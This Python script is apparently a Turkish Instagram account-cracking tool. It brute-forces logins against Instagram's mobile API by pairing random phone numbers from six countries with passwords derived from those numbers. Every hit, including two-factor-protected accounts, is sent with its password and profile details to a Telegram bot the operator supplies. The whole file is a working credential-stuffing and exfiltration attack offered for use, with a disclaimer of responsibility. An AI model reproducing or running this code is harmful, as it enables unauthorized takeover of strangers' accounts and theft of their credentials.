from typing import Mapping


try:
    import random,requests,os,uuid,time,secrets
    from uuid import uuid4
except ModuleNotFoundError:
    os.system('pip install time')
    os.system('pip install uuid')
    os.system('pip install random')
    os.system('pip install requests')
def startbr():
    toplam=0
    while True:
        chars = '123456789'
        u = '859'
        u1 = str("". join(random.choice(chars)for i in range(7)))
        u2 = str("". join(random.choice(u)for i in range(1)))
        user = '+55'+u+u1
        pasw = u+u1
        url = 'https://i.instagram.com/api/v1/accounts/login/'          
        headers = {'User-Agent': 'User-Agent: Instagram 13.0.0.7.199 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*', 
             'Cookie':'missing', 
             'Accept-Encoding':'gzip', 
             'Accept-Language':'fr-FR, en-US', 
             'X-IG-Capabilities':'AQ==', 
             'X-IG-Connection-Type':'MOBILE(HSPA+)', 
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
             'Host':'i.instagram.com'}
        uid = str(uuid4())
        data = {
        	'uuid':uid,'password':pasw, 
             'username':user, 
             'device_id':uid, 
             'from_reg':'false', 
             '_csrftoken':'missing', 
             'login_attempt_countn':'0'}
        req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
        if 'logged_in_user' in req_login.text:
            user2 = req_login.json()['logged_in_user']['username']
            info(user2,pasw)
        elif '"message":"challenge_required","challenge"' in req_login.text:
            print("  "+BYellow+f"  ⌯ İki Faktörlü Hesap --> "+BWhite+" :"+BYellow+f" {user}:{pasw} ")
            requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text=
       🔰 İKİ FAKTÖRLÜ HESAP 🔰
        ° ──────────── °
        -> İsim : {user} 
        
        -> Şifre : {pasw} 
        ° ──────────── °
        -> Kanalımız @androedit """)
        else:
            toplam += 1
            print("  "+BRed+f"  ⌯ Yanlış Hesap --> "+BWhite+" :"+BRed+f" {user}:{pasw} Toplam: {toplam}")
def startar():
    toplam=0
    while True:
        chars = '123456789'
        u = '912'
        u1 = str("". join(random.choice(chars)for i in range(7)))
        u2 = str("". join(random.choice(u)for i in range(1)))
        user = '+98'+u+u1
        pasw = u+u1
        url = 'https://i.instagram.com/api/v1/accounts/login/'          
        headers = {'User-Agent': 'User-Agent: Instagram 13.0.0.7.199 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*', 
             'Cookie':'missing', 
             'Accept-Encoding':'gzip', 
             'Accept-Language':'fr-FR, en-US', 
             'X-IG-Capabilities':'AQ==', 
             'X-IG-Connection-Type':'MOBILE(HSPA+)', 
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
             'Host':'i.instagram.com'}
        uid = str(uuid4())
        data = {
        	'uuid':uid,'password':pasw, 
             'username':user, 
             'device_id':uid, 
             'from_reg':'false', 
             '_csrftoken':'missing', 
             'login_attempt_countn':'0'}
        req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
        if 'logged_in_user' in req_login.text:
            user2 = req_login.json()['logged_in_user']['username']
            info(user2,pasw)
        elif '"message":"challenge_required","challenge"' in req_login.text:
            print("  "+BYellow+f"  ⌯ Guvenli Hesap --> "+BWhite+" :"+BYellow+f" {user}:{pasw} ")
            requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text=
     🔰 İKİ FAKTÖRLÜ HESAP 🔰
        ° ──────────── °
        
        -> İsim : {user} 
        
        -> Şifre : {pasw} 
        
        ° ──────────── °
        -> Kanalımız @androedit """)
        else:
            toplam += 1
            print("  "+BRed+f"  ⌯ Yanlış Hesap --> "+BWhite+" :"+BRed+f" {user}:{pasw} Toplam: {toplam}")
def startrs():
    toplam=0
    while True:
        chars = '123456789'
        u = '499'
        u1 = str("". join(random.choice(chars)for i in range(7)))
        u2 = str("". join(random.choice(u)for i in range(1)))
        user = '+7'+u+u1
        pasw = u+u1
        url = 'https://i.instagram.com/api/v1/accounts/login/'          
        headers = {'User-Agent': 'User-Agent: Instagram 13.0.0.7.199 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*', 
             'Cookie':'missing', 
             'Accept-Encoding':'gzip', 
             'Accept-Language':'fr-FR, en-US', 
             'X-IG-Capabilities':'AQ==', 
             'X-IG-Connection-Type':'MOBILE(HSPA+)', 
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
             'Host':'i.instagram.com'}
        uid = str(uuid4())
        data = {
        	'uuid':uid,'password':pasw, 
             'username':user, 
             'device_id':uid, 
             'from_reg':'false', 
             '_csrftoken':'missing', 
             'login_attempt_countn':'0'}
        req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
        if 'logged_in_user' in req_login.text:
            user2 = req_login.json()['logged_in_user']['username']
            info(user2,pasw)
        elif '"message":"challenge_required","challenge"' in req_login.text:
            print("  "+BYellow+f"  ⌯ Guvenli Hesap --> "+BWhite+" :"+BYellow+f" {user}:{pasw} ")
            requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text=
     🔰 İKİ FAKTÖRLÜ HESAP 🔰
        ° ──────────── °
        -> İsim : {user} 
        
        -> Şifre : {pasw} 
        ° ──────────── °
        -> Kanalımız @androedit """)
        else:
            toplam += 1
            print("  "+BRed+f"  ⌯ Yanlış Hesap --> "+BWhite+" :"+BRed+f" {user}:{pasw} Toplam: {toplam}")
def startam():
    toplam=0
    while True:
        chars = '123456789'
        u = '740'
        u1 = str("". join(random.choice(chars)for i in range(7)))
        u2 = str("". join(random.choice(u)for i in range(1)))
        user = '+1'+u+u1
        pasw = u+u1
        url = 'https://i.instagram.com/api/v1/accounts/login/'          
        headers = {'User-Agent': 'User-Agent: Instagram 13.0.0.7.199 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*', 
             'Cookie':'missing', 
             'Accept-Encoding':'gzip', 
             'Accept-Language':'fr-FR, en-US', 
             'X-IG-Capabilities':'AQ==', 
             'X-IG-Connection-Type':'MOBILE(HSPA+)', 
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
             'Host':'i.instagram.com'}
        uid = str(uuid4())
        data = {
        	'uuid':uid,'password':pasw, 
             'username':user, 
             'device_id':uid, 
             'from_reg':'false', 
             '_csrftoken':'missing', 
             'login_attempt_countn':'0'}
        req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
        if 'logged_in_user' in req_login.text:
            user2 = req_login.json()['logged_in_user']['username']
            info(user2,pasw)
        elif '"message":"challenge_required","challenge"' in req_login.text:
            print("  "+BYellow+f"  ⌯ İki Faktörlü Hesap --> "+BWhite+" :"+BYellow+f" {user}:{pasw} ")
            requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text=
       🔰 İKİ FAKTÖRLÜ HESAP 🔰
        ° ──────────── °
        
        -> İsim : {user} 
        
        -> Şifre : {pasw} 
        
        ° ──────────── °
        -> Kanalımız @androedit """)
        else:
            toplam += 1
            print("  "+BRed+f"  ⌯ Yanlış Hesap --> "+BWhite+" :"+BRed+f" {user}:{pasw} Toplam: {toplam}")
def starttr():
    toplam=0
    while True:
        chars = '123456789'
        u = '536'
        u1 = str("". join(random.choice(chars)for i in range(7)))
        u2 = str("". join(random.choice(u)for i in range(1)))
        user = '+90'+u+u1
        pasw = u+u1
        url = 'https://i.instagram.com/api/v1/accounts/login/'          
        headers = {'User-Agent': 'User-Agent: Instagram 13.0.0.7.199 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*', 
             'Cookie':'missing', 
             'Accept-Encoding':'gzip', 
             'Accept-Language':'fr-FR, en-US', 
             'X-IG-Capabilities':'AQ==', 
             'X-IG-Connection-Type':'MOBILE(HSPA+)', 
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
             'Host':'i.instagram.com'}
        uid = str(uuid4())
        data = {
        	'uuid':uid,'password':pasw, 
             'username':user, 
             'device_id':uid, 
             'from_reg':'false', 
             '_csrftoken':'missing', 
             'login_attempt_countn':'0'}
        req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
        if 'logged_in_user' in req_login.text:
            user2 = req_login.json()['logged_in_user']['username']
            info(user2,pasw)
        elif '"message":"challenge_required","challenge"' in req_login.text:
            print("  "+BYellow+f"  ⌯ İki Faktörlü Hesap --> "+BWhite+" :"+BYellow+f" {user}:{pasw} ")
            requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text=
      🔰 İKİ FAKTÖRLÜ HESAP 🔰
        ° ──────────── °
        
        -> İsim : {user} 
        
        -> Şifre : {pasw} 
        
        ° ──────────── °
        -> Kanalımız @androedit """)
        else:
            toplam += 1
            print("  "+BRed+f"  ⌯ Yanlış Hesap --> "+BWhite+" :"+BRed+f" {user}:{pasw} Toplam: {toplam}")
def startaz():
    toplam=0
    while True:
        chars = '123456789'
        u = '55'
        u1 = str("". join(random.choice(chars)for i in range(7)))
        u2 = str("". join(random.choice(u)for i in range(1)))
        user = '+994'+u+u1
        pasw = '0'+u+u1
        url = 'https://i.instagram.com/api/v1/accounts/login/'          
        headers = {'User-Agent': 'User-Agent: Instagram 13.0.0.7.199 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*', 
             'Cookie':'missing', 
             'Accept-Encoding':'gzip', 
             'Accept-Language':'fr-FR, en-US', 
             'X-IG-Capabilities':'AQ==', 
             'X-IG-Connection-Type':'MOBILE(HSPA+)', 
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
             'Host':'i.instagram.com'}
        uid = str(uuid4())
        data = {
        	'uuid':uid,'password':pasw, 
             'username':user, 
             'device_id':uid, 
             'from_reg':'false', 
             '_csrftoken':'missing', 
             'login_attempt_countn':'0'}
        req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
        if 'logged_in_user' in req_login.text:
            user2 = req_login.json()['logged_in_user']['username']
            info(user2,pasw)
        elif '"message":"challenge_required","challenge"' in req_login.text:
            print("  "+BYellow+f"  ⌯ İki Faktörlü Hesap --> "+BWhite+" :"+BYellow+f" {user}:{pasw} ")
            requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text=
       🔰 İKİ FAKTÖRLÜ HESAP 🔰
        ° ──────────── °
        
        -> İsim : {user} 
        
        -> Şifre : {pasw} 
        
        ° ──────────── °
        -> Kanalımız @androedit """)
        else:
            toplam += 1
            print("  "+BRed+f"  ⌯ Yanlış Hesap --> "+BWhite+" :"+BRed+f" {user}:{pasw} Toplam: {toplam}")
BRed="\033[1;31m" # Red
BGreen="\033[1;32m" # Green
BYellow="\033[1;33m" # Yellow
BBlue="\033[1;34m" # Blue
BPurple="\033[1;35m" # Purple
BCyan="\033[1;36m" # Cyan
BWhite="\033[1;37m" # White
lo = '— —'
os.system("clear")
print("""
"""+BWhite+""" <<<"""+BBlue+""" CANPOLAT GÖKKAYA """+BWhite+""" >>>
"""+BWhite+""" ━━━━━━✦━━━━━━✦━━━━━━✦━━━━━✦━━━━━━✦━━━━━✦━━━━━━✦━━━━━ """+BRed+"""
 
"""+BGreen+"""Bu Tool @androedit Telegram Kanalına Özeldir Çalmayın....  """+BWhite+"""
"""+BWhite+""" ━━━━━━✦━━━━━━✦━━━━━━✦━━━━━✦━━━━━━✦━━━━━✦━━━━━━✦━━━━━ """+BRed+"""                                         
""")
print(' ')
print(BRed+lo*22)
print(' ')                               
myadmin = input("  "+BYellow+" BOT ID Gir : ")
tele = input("  "+BYellow+" BOT TOKEN Gir : ")
os.system("clear")
requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text=
🌟 TOOL BAŞLADI......... 🌟
🇹🇷 <Androedit İnstaCrack> 🇹🇷
===========================
Bu Toolla Yapılan Hiçbirşeyden Sorumlu Değilim.
-----------------------------------------------------
Coded By @canpolatgkky 
-----------------------------------------------------
KANALA KATILMAYI UNUTMA : @androedit
""")
print("""
"""+BWhite+""" <<< """+BBlue+""" CANPOLAT GÖKKAYA """+BWhite+""" >>>
"""+BWhite+""" ━━━━━━✦━━━━━━✦━━━━━━✦━━━━━✦━━━━━━✦━━━━━✦━━━━━━✦━━━━━ """+BRed+"""
 
"""+BGreen+"""Bu Tool @androedit Telegram Kanalına Özeldir Çalmayın....  """+BWhite+"""
"""+BWhite+""" ━━━━━━✦━━━━━━✦━━━━━━✦━━━━━✦━━━━━━✦━━━━━✦━━━━━━✦━━━━━ """+BRed+"""                                          
""")
print(""" """+BCyan+"""
Crack Yapmak İstediğiniz Ülkeyi Seçiniz (Örn:1,2,3..) :
1) Azerbaycan (+994)
2) Türkiye (+90)
3) Rusiya (+7)
4) Arap (+98)
5) Amerikan (+1)
6) Brazil (+55)
""")
ulke=input(" "+BGreen+" Ülkenin Sayısını Giriniz : ")
os.system('clear')
print("""
   """+BRed+"""        
"""+BGreen+"""          
"""+BRed+"""《 You are learning what I forgot.. 》""")
print("""
   """+BRed+"""        
"""+BGreen+"""          
"""+BCyan+"""Canpolat Gökkaya Sunar...""")
print(' ')
print(BGreen+lo*22)
print(' ')
if ulke == "1":
    startaz()
if ulke == "2":
    starttr()
if ulke == "3":
    startrs()
if ulke == "4":
    startar()
if ulke == "5":
    startam()
if ulke == "6":
    startbr()
if ulke == "+994":
    startaz()
if ulke == "+90":
    starttr()
if ulke == "+7":
    startrs()
if ulke == "+98":
    startar()
if ulke == "+1":
    startam()
if ulke == "+55":
    startbr()
def info(user2,pasw):
    global tele,myadmin,mess
    cookie = secrets.token_hex(8)*2
    headr = {
        'HOST': "www.instagram.com",
        'KeepAlive' : 'True',
        'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
        'Cookie': 'cookie',
        'Accept' : "*/*",
        'ContentType' : "application/x-www-form-urlencoded",
        "X-Requested-With" : "XMLHttpRequest",
        "X-IG-App-ID": "936619743392459",
        "X-Instagram-AJAX" : "missing",
        "X-CSRFToken" : "missing",
        "Accept-Language" : "en-US,en;q=0.9"}
    url2 = f'https://www.instagram.com/{user2}/?__a=1'
    ree = requests.get(url2,headers=headr).json()
    name = str(ree['graphql']['user']['full_name'])
    id = str(ree['graphql']['user']['id'])
    followes = str(ree['graphql']['user']['edge_followed_by']['count'])
    following = str(ree['graphql']['user']['edge_follow']['count'])
    re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")   
    ree = re.json()
    datee = ree['data']
    ms = f"""
😜 Tebrikler Hesap Buldun 😜
═───────◇───────═
❶➾ Kullanıcı Adı : {user2}
❷➾ İsim : {name}
❸➾ Şifre : {pasw} 
❹➾ Takipçi : {followes}
❺➾ Takip : {following}
❻➾ Tarih : {datee}
 ═───────◇───────═
⊱ Sus Ve Sessizliği Dinle...... ⊰ """
    requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text={ms}""")    
    print(BGreen+ms)